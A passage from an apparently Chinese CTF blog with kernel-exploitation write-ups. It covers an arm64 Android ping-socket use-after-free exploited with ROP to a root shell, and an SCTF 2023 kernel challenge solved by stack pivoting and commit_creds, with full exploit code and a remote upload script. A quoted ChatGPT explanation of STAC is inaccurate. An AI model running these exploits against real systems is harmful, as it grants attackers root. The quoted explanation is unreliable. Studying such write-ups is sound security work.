ROP\n\n以下是我用纯rop完成利用的exp\n\n```c\n#include <stdio.h>\n#include <stdlib.h>\n#include <stdint.h>\n#include <unistd.h>\n#include <fcntl.h>\n#include <errno.h>\n#include <limits.h>\n#include <signal.h>\n#include <string.h>\n#include <time.h>\n#include <pthread.h>\n#include <sys/wait.h>\n#include <sys/sysinfo.h>\n#include <sys/types.h>\n#include <sys/mman.h>\n#include <sys/socket.h>\n#include <linux/in.h>\n#include <linux/sockios.h>\n\n#define MAX_SOCK_NUM 4000\n\n#define MAX_MMAP_NUM 6\n#define ONE_MMAP_SIZE 128*1024*1024\n\n#define SK_STAMP_OFFSET 0x1E0\n\n#define SIOCGSTAMPNS 0x8907\n#define NSEC_PER_SEC 1000000000\n\n#define MAGIC_VALUE 0x66666666          // test before use\n\n#define MAP_STACK_SIZE 0x200\n\nint vuln_sock[MAX_SOCK_NUM];\nvoid* mmaped[MAX_MMAP_NUM];\n\nint mmap_page_count;\nvoid* mmap_per_page[(ONE_MMAP_SIZE/PAGE_SIZE) * MAX_MMAP_NUM];\n\nint vuln_sock_index;\nvoid* vuln_page;\n\nint maximize_fd_limit(){\n\tstruct rlimit rlim;\n\tgetrlimit(RLIMIT_NOFILE, &rlim);\n\n\trlim.rlim_cur = rlim.rlim_max;\n\tsetrlimit(RLIMIT_NOFILE, &rlim);\n\n\tgetrlimit(RLIMIT_NOFILE, &rlim);\n\treturn rlim.rlim_cur;\n}\n\nvoid mmap200200(){\n\tint ret=0;\n\tvoid *addr;\n\taddr = mmap((void*)0x200000, PAGE_SIZE, PROT_READ|PROT_WRITE, MAP_SHARED|MAP_FIXED|MAP_ANONYMOUS, -1, 0);\n\tif(addr == -1){\n\t\tprintf(\"failed to mmap 0x200200\\\\n\");\n\t\texit(1);\n\t}\n\t*(unsigned*)addr = 0x100;\n\tret = mlock(addr,PAGE_SIZE);\n\tif(ret != 0){\n\t\tprintf(\"failed to mlock 0x200200\\\\n\");\n\t\texit(1);\n\t}\n}\n\nvoid create_vuln_socks(){\n    int i,j;\n\n    struct sockaddr_in sa1;\n\tmemset(&sa1,0x0,sizeof(sa1));\n    sa1.sin_family = AF_INET;\n\n    struct sockaddr_in sa2;\n\tmemset(&sa2,0x0,sizeof(sa2));\n    sa2.sin_family = AF_UNSPEC;\n\n    for(i = 0; i < MAX_SOCK_NUM; i++){\n        vuln_sock[i] = socket(AF_INET,SOCK_DGRAM,IPPROTO_ICMP);\n        if(vuln_sock[i] <= 0){\n            printf(\"create socket error: %s (%d)\", strerror(errno), errno);\n        }\n        connect(vuln_sock[i],&sa1,sizeof(sa1));\n    }\n\n    for(i = 0; i < MAX_SOCK_NUM; i++){\n\t    connect(vuln_sock[i],&sa2,sizeof(sa2));\n\t    connect(vuln_sock[i],&sa2,sizeof(sa2));\n    }\n\n}\n\nvoid mmap_spray(){\n    int i,j;\n\n    void* mapped_page;\n\n    mmap_page_count = 0;\n\n    for(i = 0; i < MAX_MMAP_NUM; i++){\n        mmaped[i] = mmap(NULL, ONE_MMAP_SIZE , PROT_READ | PROT_WRITE, MAP_SHARED | MAP_ANONYMOUS, -1, 0);\n        // PRIVATE POPULATE? seems unnecessary\n        if(mmaped[i] == MAP_FAILED){\n            printf(\"mmap failed\\\\n\");\n            sleep(1);\n        \texit(1);\n        }\n  \n        for(j = 0 ;j < ONE_MMAP_SIZE/PAGE_SIZE; j++){\n            memset((char*)mmaped[i],0x41,PAGE_SIZE);                 \n            mapped_page = (void*)((char*)mmaped[i]+j*PAGE_SIZE);\n            *(unsigned long long*)((char*)mapped_page + SK_STAMP_OFFSET) = MAGIC_VALUE +  mmap_page_count;\n            mmap_per_page[mmap_page_count] = mapped_page;\n            mmap_page_count++;\n        }\n        printf(\" [-] %d/%d\\\\n\",i+1, MAX_MMAP_NUM);\n    }\n}\n\nint find_target_sk(int num){\n    int i,j,ret;\n    struct timespec time;\n    unsigned long long value;\n    unsigned long long compare_value;\n    int found = 0;\n\n    vuln_sock_index = 0;\n\n    for(i = num ; i < MAX_SOCK_NUM; i++){\n        memset(&time, 0x0, sizeof(time));\n        ret = ioctl(vuln_sock[i], SIOCGSTAMPNS, &time);\n        value = ((unsigned long long)time.tv_sec * NSEC_PER_SEC) + time.tv_nsec;\n\n        for(j = 0; j < mmap_page_count; j++){\n            compare_value = *(unsigned long long *)((char*)mmap_per_page[j]+SK_STAMP_OFFSET);\n            if( value == compare_value){\n                printf(\"\\\\n [-] found a vuln sock, index: %d, maigc value: 0x%llx\\\\n\",i,value);\n                vuln_sock_index = i;\n                vuln_page = mmap_per_page[j];\n                found = 1;\n                break;\n            }\n        }\n        \n        if(found == 1){\n            break;\n        }\n\n    }\n    \n    if(found == 1){\n        return 0;\n    }else{\n        return 1;\n    }\n\n}\n\nvoid get_shell(){\n    if(getuid() == 0){\n        printf(\" [-] returned to user space.\\\\n [-] here is a root shell\\\\n\");\n        execl(\"/system/bin/sh\", \"sh\", NULL);\n    }else{\n        printf(\" [-] failed to get root\\\\n\");\n        sleep(10);\n    }\n}\n\nvoid rop_get_shell(){\n\n\tint i,j,ret;\n    void* stack_addr = &j;\n\n    printf(\" [-] prepare rop gadget.\\\\n\");\n    void* map_addr_1 = mmap(0, MAP_STACK_SIZE, PROT_READ|PROT_WRITE, MAP_PRIVATE|MAP_ANONYMOUS, -1, 0);\n    void* map_addr_2 = mmap(0, MAP_STACK_SIZE, PROT_READ|PROT_WRITE, MAP_PRIVATE|MAP_ANONYMOUS, -1, 0);\n    void* map_addr_3 = mmap(0, MAP_STACK_SIZE, PROT_READ|PROT_WRITE, MAP_PRIVATE|MAP_ANONYMOUS, -1, 0);\n\n    memset(map_addr_1,0x0,MAP_STACK_SIZE);\n    memset(map_addr_2,0x0,MAP_STACK_SIZE);\n    memset(map_addr_3,0x0,MAP_STACK_SIZE);\n\n    int idx_1 = 0;\n    ((unsigned long long *)map_addr_1)[idx_1++] = (unsigned long long)map_addr_2;\t\t// x29\n    ((unsigned long long *)map_addr_1)[idx_1++] = 0xffffffc0000d9384;\t\t// x30\n    ((unsigned long long *)map_addr_1)[idx_1++] = 0x3f20;\t\t// x19  x0+x19\n    ((unsigned long long *)map_addr_1)[idx_1++] = 0x0;\t\t// x20\n    ((unsigned long long *)map_addr_1)[idx_1++] = 0x0;\t\t// x29\n    ((unsigned long long *)map_addr_1)[idx_1++] = 0xffffffc0000f1194;\t\t// x30\n    ((unsigned long long *)map_addr_1)[idx_1++] = 0x0;\n    ((unsigned long long *)map_addr_1)[idx_1++] = 0x0;\n    ((unsigned long long *)map_addr_1)[idx_1++] = 0x0; \t\t// x29\n    ((unsigned long long *)map_addr_1)[idx_1++] = 0xffffffc0004ceab0;\t\t// x30\n    ((unsigned long long *)map_addr_1)[idx_1++] = (unsigned long long)map_addr_2+0x38;\t\t// x19\n    ((unsigned long long *)map_addr_1)[idx_1++] = 0x0;\t\t// x20\n    ((unsigned long long *)map_addr_1)[idx_1++] = (unsigned long long)map_addr_2;\t\t\t// x29\n    ((unsigned long long *)map_addr_1)[idx_1++] = 0xffffffc0004f7138;\t\t\t//x30\n    ((unsigned long long *)map_addr_1)[idx_1++] = (unsigned long long)map_addr_2;\t\t// x19\n    ((unsigned long long *)map_addr_1)[idx_1++] = 0x0;\t\t// x20\n    ((unsigned long long *)map_addr_1)[idx_1++] = 0x0;\t\t// dirt\n    ((unsigned long long *)map_addr_1)[idx_1++] = 0x0;\t\t// x9 will be stored here\n    ((unsigned long long *)map_addr_1)[idx_1++] = (unsigned long long)map_addr_3;\t\t// x29\n    ((unsigned long long *)map_addr_1)[idx_1++] = 0xffffffc0000d9384;\t\t// x30\n    ((unsigned long long *)map_addr_1)[idx_1++] = 0x0;\t\t\t// x29\n    ((unsigned long long *)map_addr_1)[idx_1++] = 0xffffffc000132cb8;\t\t\t\t// x30\n    ((unsigned long long *)map_addr_1)[idx_1++] = 0x0;\n    ((unsigned long long *)map_addr_1)[idx_1++] = 0x0;\n    ((unsigned long long *)map_addr_1)[idx_1++] = 0x0;\t\t// x29\n    ((unsigned long long *)map_addr_1)[idx_1++] = 0xffffffc000084240;\t\t\t// x30\n    ((unsigned long long *)map_addr_1)[idx_1++] = 0x0;\t\t\n    ((unsigned long long *)map_addr_1)[idx_1++] = 0x0;\n\n    int idx_2 = 0;\n    ((unsigned long long *)map_addr_2)[idx_2++] = (unsigned long long)map_addr_2;\t\t\t// x0\n    ((unsigned long long *)map_addr_2)[idx_2++] = 0x0;\t\t\t// x0\n    ((unsigned long long *)map_addr_2)[idx_2++] = 0x0;\t\t\t// x0\n    ((unsigned long long *)map_addr_2)[idx_2++] = 0xffffffc0002999ec;\t// x1\tblr x1,(x0 +=x19)\n    ((unsigned long long *)map_addr_2)[idx_2++] = 0x0;\t\t\t// x29\n    ((unsigned long long *)map_addr_2)[idx_2++] = 0x0;\t\t\t// x30\n    *(unsigned long long *)((char*)map_addr_2+0x1b0) = 0xffffffc00009e8b8;  // ldr x8,[x8,0x1b0]\n    // ((unsigned long long *)map_addr_2)[0x1b0] = 0xffffffc00009e8b8;  // ldr x8,[x8,0x1b0]\n\n    int idx_3 = 0;\n    ((unsigned long long *)map_addr_3)[idx_3++]  = 0xffffffc000084290;\n    ((unsigned long long *)map_addr_3)[idx_3++]  = 0x0;\n    ((unsigned long long *)map_addr_3)[idx_3++] = (unsigned long long)map_addr_3;\t// x0\n    ((unsigned long long *)map_addr_3)[idx_3++] = 0x0;\t\t// x1\n    ((unsigned long long *)map_addr_3)[idx_3++] = 0x0;\n    ((unsigned long long *)map_addr_3)[idx_3++] = 0x0;\n\n    printf(\" [-] call colse(vuln_sock) to trigger a rip hijack\\\\n\");\n    // close(vuln_sock[vuln_sock_index]);\n    int target_sock = vuln_sock[vuln_sock_index];\n    asm volatile(\n        \"LDR     X0, %3 \\\\n\\\\t\"   \n        \"LDR     X1, =0xFFFFFFC0000C0014 \\\\n\\\\t\"\n        \"LDR     X2, =0x0 \\\\n\\\\t\"   \n        \"LDR     X3, =0xFFFFFFC0006EB94C \\\\n\\\\t\"\n        \"LDR     X5, =0xFFFFFFC0000BFAB4 \\\\n\\\\t\"\n        \"LDR     X6, =0x06060606 \\\\n\\\\t\"   \n        \"LDR     X7, =0X07070707 \\\\n\\\\t\"\n        \"LDR     X8, =0x39 \\\\n\\\\t\"   \n        \"LDR     X9, =0xffffffc00025bc94 \\\\n\\\\t\"\n        \"LDR     X17, =0xffffffc0000876a0 \\\\n\\\\t\"\n        \"LDR     X18, =0x18181818 \\\\n\\\\t\"   \n        \"LDR     X20, %1 \\\\n\\\\t\"   \n        \"LDR     X21, =0xffffffc000204894 \\\\n\\\\t\"  \n        \"LDR     X24, =get_shell \\\\n\\\\t\"   \n        \"LDR     X25, =0x0 \\\\n\\\\t\"\n        \"LDR     X26, %2 \\\\n\\\\t\"\n        \"SVC\t#0 \\\\n\\\\t\"\n        : \"=r\" (ret)\n        : \"m\" (map_addr_1), \"m\" (stack_addr), \"m\" (target_sock)\n        : \"x0\", \"x1\", \"x2\", \"x3\", \"x5\", \"x8\", \"x9\", \"x17\", \"x20\", \"x21\", \"x24\", \"x25\", \"x26\"\n    );\n\n}\n\nint main(){\n    int i,j,k,ret;\n\n\tret = maximize_fd_limit();\n\tprintf(\"[+] set rlimlit, now rlim.rlim_cur: %d\\\\n\",ret);\n\tmmap200200();\n\tprintf(\"[+] mmap 0x200200 to avoid crash\\\\n\");\n\n    printf(\"[+] step 1: create vuln socks\\\\n\");\n    create_vuln_socks();\n\n    printf(\"[+] step 2: mmap spray to overwrite vuln socks\\\\n\");\n    mmap_spray();\n\n    printf(\"[+] step 3: find the target sk\\\\n\");\n    ret = find_target_sk(0);\n    if(ret == 1){\n        printf(\"didn't find a usable sock...\\\\n\");\n        sleep(1);\n        exit(1);\n    }\n\n    printf(\"[+] step 4: rop to get root shell\\\\n\");\n\n// get root\n    unsigned long long add_sp_0x100 = 0xffffffc000118458;           // 0xffffffc000118458 : add sp, sp, #0x100 ; ret\n\n    *(unsigned long long*)((char*)vuln_page) = add_sp_0x100;            // inet_release(): LDR X2, [X2]; BLR X2;\n    *(unsigned long long*)((char*)vuln_page+0x28) = (unsigned long long)vuln_page;           // inet_release(): LDR X2, [X19,#0x28]; \n    *(unsigned long long*)((char*)vuln_page+0x2A0) = 0x0;               // ip_mc_drop_socket(): LDR X1, [X0,#0x2A0]; CBZ X1, loc_FFFFFFC000432440\n\n    rop_get_shell();\n\n    printf(\"should never be there!\\\\n\");\n    return 0;\n}\n```\n\n\n\nROP打通那一刻真的超级开心！！！虽然说通用性没那么强，但着实锻炼了找 arm64 rop gadget 的能力。\n\n![image-20230903213052902](./image-20230903213052902.png?size=600)\n\n\n\n# android 11 环境下3636的利用\n\n\n\n## 基本信息\n\n架构：aarch64\n\nlinux版本：5.4.40\n\n防护措施：开启KASLR，PAN，PXN，CFI，selinux\n\n\n\n这个题卡在内核访问0x200200这个地址会崩溃上，PAN不知道怎么绕。\n\n搜索PAN绕过方法时，仅找到这篇文章：https://blog.siguza.net/PAN/ ，意思是用户态映射一个 `--x` 权限的页面时，内核直接访问该页面并不会触发PAN。\n\n我在android 11这个环境里试了一下，没成功。。\n\n\n\n于是又冒出个很业余的想法，copy_from_user()执行的时候内核必须要访问用户态，是不是说明会短暂关闭PAN？那让某个线程在copy_from_user()期间卡住，其他内核线程是不是就可以访问任意用户态地址，从而绕过PAN了？事实证明linux内核远没有这么简单，无论是X86还是ARM，copy_from_user() 时都没有动过全局的SMEP/PAN开关，而是通过一些 “状态寄存器+硬件功能” 结合的方式将控制粒度细化到线程级别。\n\n以下是对 copy_from_user() 函数的一些理解：\n\n1. 在开启SMAP的机器上，copy_from_user()是如何将用户态数据拷贝到内核态的？【✔】\n\n   SMAP是硬件的特性，由CR4寄存器控制是否开启该特性。copy_from_user()执行的过程中，不会改变CR4寄存器中SMAP的标记位，而是通过 STAC 让当前代码具备访问用户空间的能力。完成拷贝后，又通过 CLAC 关闭该能力。\n\n   这一信息的来源是stackoverflow上的一篇回答：https://stackoverflow.com/a/61498446\n\n   紧接着，根据 STAC CLAC 搜到了一些中文文章：https://zhuanlan.zhihu.com/p/64536162\n\n   官方邮件：https://lwn.net/Articles/517251/\n\n   wiki中的解释：https://en.wikipedia.org/wiki/Supervisor_Mode_Access_Prevention\n\n   chatgpt对 STAC指令的一些解释：\n\n   ```\n   在x86架构中，STAC（Supervisor-Trap Access Control）并不是一条独立的指令，而是通过修改 EFLAGS 寄存器中的一个标志位来实现的。具体来说，STAC特性通过修改 EFLAGS 寄存器中的 AC（Alignment Check）标志位来启用或禁用。\n   \n   当 AC 标志位被置为 1 时，STAC 特性被启用，表示在内核模式下执行的代码要执行用户空间数据访问。如果在这个模式下尝试访问用户空间数据，将会触发一个异常。这个异常可以被内核捕获和处理，从而增加对用户空间数据的保护。\n   \n   需要注意的是，修改 EFLAGS 寄存器中的 AC 标志位是特权级别 0 的操作，即内核模式下才能执行。用户空间代码不能直接访问 EFLAGS 寄存器或修改其中的标志位。\n   \n   STAC 特性通常与 SMAP（Supervisor Mode Access Prevention）一起使用，以提供更强大的内存访问控制和安全保护。SMAP用于阻止内核模式下的代码直接访问用户空间的数据，而 STAC 用于在内核模式下执行用户空间的数据访问，并触发异常以进行后续处理。这两个特性结合起来，可以增加对用户空间数据的保护。\n   ```\n\n   源于：突然有个神奇的想法，以为copy_from_user()执行期间，会关闭SMAP/PAN。那么只要通过userfaultfd或者fuse让copy_from_user()卡住，那么其他内核线程不就可以绕过SMAP/PAN，实现任意用户空间访问了吗？\n\n   答案：事实远没有这么简单，因为copy_from_user()执行期间，不会去动CR4或者CP15寄存器，而是设置flag寄存器。所以完全不会发生我上面说的那种情况。\n\n   \n\n2. arm/aarch64架构上的copy_from_user()是如何将用户态数据拷贝到内核态的？【✔】\n\n   PAN，涉及哪些寄存器？flag寄存器又是什么？\n\n   aarch64上每个线程有自己的 `thread_info→ttbr0` 寄存器。刚陷入内核态时，ttbr0_el1是空的，因为进入内核后不需要访问用户态空间，相当于一个天然的KPTI防护。当遇到copy_from_user()之类的函数需要访问用户态空间时，会将`thread_info→ttbr0` 的值给 ttbr0_el1，这样就可以访问用户态了。\n\n   那么，疑问来了，ttbr0_el1是全局的，被设置后，其他线程是不是就可以访问该线程的用户空间呢？当然不行，分两种情况。1、对于后来新起的线程，进入内核时，ttbr0_el1会被清零，不会接触到上一个线程的残留数据。2、对于之前已经存在的线程，在线程切换时，这些寄存器都会更新，也不会接触到残留数据。所以，这个拷贝方案是安全的。\n\n   补充：关于arm64 linux下的copy_from_user可以参考这篇文章 - [copy_{to,from}_user()的思考](http://www.wowotech.net/memory_management/454.html)\n\n\n\n最后，问了主办方这个题有没有解，主办方说目前没有解，做开放讨论。ok，那我这水平也可以放弃跟这道题较劲了。。\n\n","tags":["kernel pwn","android"],"categories":["GeekCon 2023"]},{"title":"SCTF 2023 Kernel Pwn Sycrop","url":"/2023/07/05/230705-sctf2023-kernel-pwn-sycrop/","content":"\n\n\n![image](./20230706.png)\n\n# 分析\n\n## 基本信息\n\n题目附件：[sycrop.zip](sycrop.zip)\n\n防护措施：kaslr，smep，smap，kpti\n\n## 漏洞点\n\n本题ko代码量不大，漏洞点也比较明显\n\n```c\n__int64 __fastcall seven_ioctl(file *filp, __int64 cmd, unsigned __int64 arg)\n{\n  __int64 v4; // r14\n  __int64 result; // rax\n\n  if ( (_DWORD)cmd != 0x6666 )\n  {\n    v4 = -1LL;\n    if ( (_DWORD)cmd == 0x5555 )\n    {\n      if ( pray )\n      {\n        printk(\"\\x1B[35m\\x1B[1m[*]no no no\\n\", cmd);\n      }\n      else\n      {\n        pray = 1;\n        printk(\"\\x1B[31m\\x1B[1m[*]pray\\n\", cmd);\n        return *(_QWORD *)arg;                  // 任意地址信息泄露\n      }\n    }\n    return v4;\n  }\n  if ( come_true )\n    return 0LL;\n  result = printk(\"\\x1B[34m\\x1B[1m[*]SYCrop by 77\\n\", cmd);\n  come_true = 1;\n  return result;                                // 此处得看汇编，汇编层面有一句\"rsp=arg\"，也就是说允许我们把栈迁移到传入arg指向的地址\n}\n```\n\n两个漏洞总结如下：\n\n1. cmd=0x5555可以泄露任意内核地址的内容（仅能泄露低4字节内容）\n\n2. cmd=0x6666可以将内核栈迁移到任意位置\n\n\n\n问题来了，本题开启了KASLR，需要信息泄露后才能继续往下做，所以从哪个位置泄露呢？经过一顿尝试以及查找资料，在[hxp](https://hxp.io/blog/99/hxp-CTF-2022-one_byte-writeup/)的这篇博客中发现了`cpu_entry_area`，系统调用modify_ldt会改变0xffff880000000000（LDT remap for PTI）区域的内容。于是有了如下测试：\n\n- 利用sys_modify_ldt写可以在0xffff880000000000区域创建新的ldt，内容用户态可控，但不是全部可控。无法构造rop，尝试失败\n\n- `cpu_entry_area`区域无随机化，且有内核地址，如0xfffffe0000002f38这个固定地址处处能泄露一个内核地址。\n- `cpu_entry_area`还有个神奇的发现，当用户态执行系统调用时，有一定概率用户态寄存器内容会被放入0xfffffe0000002f58处，有点类似pt_regs。虽然寄存器内容出现在0xfffffe0000002f58的概率比较低，但是当时也没有什么好办法，只能栈迁移到此处执行rop了。（后来知道这个区域叫做entry_stack_page，用户态和内核态上下文切换时，寄存器就会暂存到该区域。）\n\n如此，信息泄露和栈迁移的位置就都搞定了！\n\n# 利用\n\n## 做题时的exp\n\n回顾做题过程，总结几个问题：\n\n- 做题时不知道ret2hbp这么个方法，所以栈迁移到了不怎么稳定的entry_stack_page处\n- 做题时，选择系统调用的方式将用户态寄存器数据放入entry_stack_page，该方法部分寄存器内容无法控制，导致一次栈迁移空间不够，又使用copy_from_user做了二次栈迁移，步骤就略显复杂了（Nu1l使用硬件断点的方式，能控寄存器比系统调用方式多）\n- 做题时忽略了寄存器rbp，以及系统调用时rsi和rdx可以控制成任何值\n\n第一版exp如下，幸运的是打远程第一次就成了，不幸的是后来接连6/7次都没成....概率确实低\n\n```c\n// gcc exp.c -static -masm=intel -lpthread -o exp\n#include<stdio.h>\n#include<stdlib.h>\n#include<stdint.h>\n#include <unistd.h>\n#include<string.h>\n#include<sys/ioctl.h>\n#include <sys/syscall.h>\n#include<fcntl.h>\n#include <errno.h>\n#include <pthread.h>\n#include <signal.h>\n\n#define BZIMAGE_BASE 0xFFFFFFFF81000000\n\nint fd;\nextern int errno;\n\nuint64_t pop_rdi_ret = 0xffffffff81002c9d;\nuint64_t init_cred_addr = 0xFFFFFFFF82A4CBF8;\nuint64_t pkc_func = 0xFFFFFFFF810BB9A0;\nuint64_t cc_func = 0xFFFFFFFF810BB5B0;\nuint64_t kpti_tramp = 0xFFFFFFFF82000F01;\n\n\nuint64_t pop_rdx_rsi_rdi_ret = 0xffffffff810034ba;\nuint64_t temp_stack = 0xfffffe0000002d00;\t\t\t\t// 第二次栈迁移时栈的位置\nuint64_t copy_fu_func = 0xFFFFFFFF81549BE0;\nuint64_t pop_ret = 0xffffffff810034bd;\nuint64_t pop_rsp_ret = 0xffffffff812af92f;          //  : pop rsp ; ret;\n\nuint64_t gadget_buf[0x100] = {0};\nuint64_t gadget_addr = (uint64_t)gadget_buf;\n\n\nvoid* ioctl_5555(void* arg){\n    __asm__(\n        \"mov r15, pop_rdx_rsi_rdi_ret;\"\n        \"mov r14, 0x100;\"      // 4\n        \"mov r13, gadget_addr;\"      // 3\n        \"mov r12, temp_stack;\"      // 2\n        \"mov r11, 0x11111111;\"\n        \"mov r10, copy_fu_func;\"      // r10\n        \"mov rbx, pop_ret;\"      // 1\n        \"mov r9, pop_rsp_ret;\"       // r9\n        \"mov r8, temp_stack;\"       //r8\n        \"mov rcx, 0xcccccccc;\"\n        \"mov rax, 0x10;\"\n        \"mov rdx, 0xfffffe0000002f38;\"\n        \"mov rsi, 0x5555;\"\n        \"mov rdi, fd;\"\n        \"syscall\"\n    );\n}\n\nvoid getshell(){\n    printf(\"[+] return to user success!\\n\");\n    system(\"/bin/sh\");\n}\n\nsize_t user_cs, user_rflags, user_sp, user_ss;\nvoid save_status(){\n    __asm__(\"mov user_cs, cs;\"\n            \"mov user_ss, ss;\"\n            \"mov user_sp, rsp;\"\n            \"pushf;\"\n            \"pop user_rflags;\"\n            );\n    puts(\"[*]status has been saved.\");\n}\n\nint main(){\n    save_status();\n\n    fd = open(\"/dev/seven\",2);\n\n// leak kernel_base\n    uint64_t target_addr = 0xfffffe0000002f38;\n    uint64_t ret = ioctl(fd,0x5555,target_addr);\n    uint64_t kernel_base = ret - 0xeec205;\n    printf(\"kernel_base: 0x%lx\\n\",kernel_base);\n\n// set params\n    pop_rdi_ret = pop_rdi_ret - BZIMAGE_BASE + kernel_base;\n    init_cred_addr = init_cred_addr - BZIMAGE_BASE + kernel_base;\n    pkc_func = pkc_func - BZIMAGE_BASE + kernel_base;\n    cc_func = cc_func - BZIMAGE_BASE + kernel_base;\n    kpti_tramp = kpti_tramp - BZIMAGE_BASE + kernel_base;\n\n    pop_rdx_rsi_rdi_ret = pop_rdx_rsi_rdi_ret - BZIMAGE_BASE + kernel_base;\n    copy_fu_func = copy_fu_func - BZIMAGE_BASE + kernel_base;\n    pop_ret = pop_ret - BZIMAGE_BASE + kernel_base;\n    pop_rsp_ret = pop_rsp_ret - BZIMAGE_BASE + kernel_base;   \n\n\n// set gadget\n    int a = 0;\n    gadget_buf[a++] = pop_rdi_ret;\n    gadget_buf[a++] = init_cred_addr;\n    gadget_buf[a++] = cc_func;\n    gadget_buf[a++] = kpti_tramp;\n    gadget_buf[a++] = 0x0;\n    gadget_buf[a++] = 0x0;\n    gadget_buf[a++] = (uint64_t)getshell;\n    gadget_buf[a++] = user_cs;\n    gadget_buf[a++] = user_rflags;\n    gadget_buf[a++] = user_sp;\n    gadget_buf[a++] = user_ss;\n\n// hijack control flow\n    pthread_t th1;\n    pthread_create(&th1,NULL,ioctl_5555,0);\n    usleep(400);            \t\t\t\t//400时，这个poc，能够有较大概率将控制流劫持到0x15151515，先基于这个做题吧\n    ioctl(fd,0x6666,0xfffffe0000002f58);\n\n    return 0;\n}\n```\n\n\n\n\n\n## 更新版exp\n\n目前看过的exp有Nu1l和题目作者pray77的，Nu1l虽然使用了hbp的方法，但是栈迁移选择的位置并未找对。Nu1l跟我都是迁移到entry_stack_page（0xfffffe0000002f58）这个位置，这里变化很快，所以是概率性成功（Nu1l通过连续触发100次hbp使寄存器数据保留在entry_stack_page上，从而大大提高了成功的概率）。而预期的位置是DB stack处（0xfffffe0000010f58），这里的内容是稳定的。\n\n理解完作者所说的ret2hbp方法后，更改了一版exp，成功率达成100%，如下\n\n```c\n#define _GNU_SOURCE\n#include <stdio.h>\n#include <stdlib.h>\n#include <unistd.h>\n#include <sys/user.h>\n#include <stddef.h>\n#include <sys/wait.h>\n#include <sys/ptrace.h>\n#include <sched.h>\n#include<stdint.h>\n#include<string.h>\n#include<sys/ioctl.h>\n#include <sys/syscall.h>\n#include<fcntl.h>\n#include <errno.h>\n#include <pthread.h>\n#include <signal.h>\n\n#define BZIMAGE_BASE 0xFFFFFFFF81000000\n\nint fd;\nextern int errno;\n\nuint64_t pop_rdi_ret = 0xffffffff81002c9d;\nuint64_t init_cred_addr = 0xFFFFFFFF82A4CBF8;\nuint64_t cc_func = 0xFFFFFFFF810BB5B0;\nuint64_t kpti_tramp = 0xFFFFFFFF82000F01;\nuint64_t ret_func= 0;\n\npid_t hbp_pid;\nint status;\nchar buf[0x10];\n\nvoid create_hbp(void* addr)     \n{\n    if(ptrace(PTRACE_POKEUSER,hbp_pid, offsetof(struct user, u_debugreg), addr) == -1) {\n        printf(\"Could not create hbp! ptrace dr0: %m\\n\");\n        kill(hbp_pid,9);\n        exit(1);\n    }\n    if(ptrace(PTRACE_POKEUSER,hbp_pid, offsetof(struct user, u_debugreg) + 56, 0xf0101) == -1) {\n        printf(\"Could not create hbp! ptrace dr7: %m\\n\");\n        kill(hbp_pid,9);\n        exit(1);\n    }\n}\n\nvoid getshell(){\n    printf(\"[+] return to user success!\\n\");\n    system(\"/bin/sh\");\n}\n\nsize_t user_cs, user_rflags, user_sp, user_ss;\nvoid save_status(){\n    __asm__(\"mov user_cs, cs;\"\n            \"mov user_ss, ss;\"\n            \"mov user_sp, rsp;\"\n            \"pushf;\"\n            \"pop user_rflags;\"\n            );\n    puts(\"[*]status has been saved.\");\n}\n\nint main(){\n    ret_func = (uint64_t)&getshell;\n    save_status();\n\n    fd = open(\"/dev/seven\",2);\n\n    // 1. leak kernel_base\n    uint64_t target_addr = 0xfffffe0000002f38;\n    uint64_t ret = ioctl(fd,0x5555,target_addr);\n    uint64_t kernel_base = ret - 0xeec205;\n    printf(\"kernel_base: 0x%lx\\n\",kernel_base);\n\n    // set params\n    pop_rdi_ret = pop_rdi_ret - BZIMAGE_BASE + kernel_base;\n    init_cred_addr = init_cred_addr - BZIMAGE_BASE + kernel_base;\n    cc_func = cc_func - BZIMAGE_BASE + kernel_base;\n    kpti_tramp = kpti_tramp - BZIMAGE_BASE + kernel_base;\n\n    // 2. create hbp\n    hbp_pid = fork();\n    if(hbp_pid == 0){\n        cpu_set_t mask;\n        CPU_ZERO(&mask);\n        CPU_SET(1,&mask);\n        sched_setaffinity(0,sizeof(mask),&mask);\n\n        ptrace(PTRACE_TRACEME,0,NULL,NULL);\n        raise(SIGSTOP);                         \n\n        __asm__(\n            \"mov r15,   pop_rdi_ret;\"\n            \"mov r14,   init_cred_addr;\"\n            \"mov r13,   cc_func;\" \n            \"mov r12,   kpti_tramp;\"\n            \"mov rbp,   0x0;\"\n            \"mov rbx,   0x0;\"\n            \"mov r11,   ret_func;\"\n            \"mov r10,   user_cs;\"\n            \"mov r9,    user_rflags;\"\n            \"mov r8,    user_sp;\"\n            \"mov rax,   user_ss;\"\n            \"mov rcx,   0xcccccccc;\"\n            \"mov rdx,   0xdddddddd;\"\n            \"mov rsi,   buf;\"\n            \"mov rdi,   [rsi];\"\n        );\n        exit(1);\n    }\n\n    waitpid(hbp_pid,&status,0);         \n\n    create_hbp(buf);\n\n    ptrace(PTRACE_CONT,hbp_pid,0,0);            \n    waitpid(hbp_pid,&status,0);          \n\n    ptrace(PTRACE_CONT,hbp_pid,0,0);\n    waitpid(hbp_pid,&status,0);          \n\n    // 3. hijack control flow\n    ioctl(fd,0x6666,0xfffffe0000010f58);\n\n    return 0;\n}\n```\n\n\n\n## 远程上传脚本\n\n```python\nimport gmpy2,os\nfrom pwn import *\n \ndef do_pow(r):\n    if os.environ.get('NOPOW') is not None: return\n    r.recvuntil(b'2^(2^')\n    bit=int(r.recvuntil(b')',drop=True))\n    r.recvuntil(b'mod ')\n    mod=int(r.recvuntil(b' =',drop=True))\n    r.sendline(str(gmpy2.powmod(2,gmpy2.bit_set(0,bit),mod)).encode())\n    r.recvuntil(b'ok\\n')\n    \nio = remote('xxx.xxx.xxx.xxx',7777)\ndo_pow(io)\n\npayload = b64e(open(\"./exp\",'rb').read())\na = len(payload) // 500\nfor i in range(a + 1):\n    print(\"[+] %d/%d\" % (i,a))\n    s = 'echo \"' + payload[i*(500):(i+1)*500] + '\" >> /tmp/exp.b64'\n    io.sendlineafter(b\"/ $\",s.encode('utf-8'))\n\nio.sendlineafter(b\"/ $\",b'cat /tmp/exp.b64 | base64 -d > /tmp/exp')\nio.sendlineafter(b\"/ $\",b'chmod +x /tmp/exp')\n\ncontext(log_level='debug')\nio.interactive()\n# while 1:\n#     t = io.recvuntil(b\"/\")\n#     print(t.replace(b\"\\r\",b'').decode('utf-8'))\n#     io.send(input().encode('utf-8'))\n```\n\n\n\n参考：\n\n[题目作者pray77 WP](https://github.com/pray77/SCTF2023_kernelpwn)\n\n[Nu1L 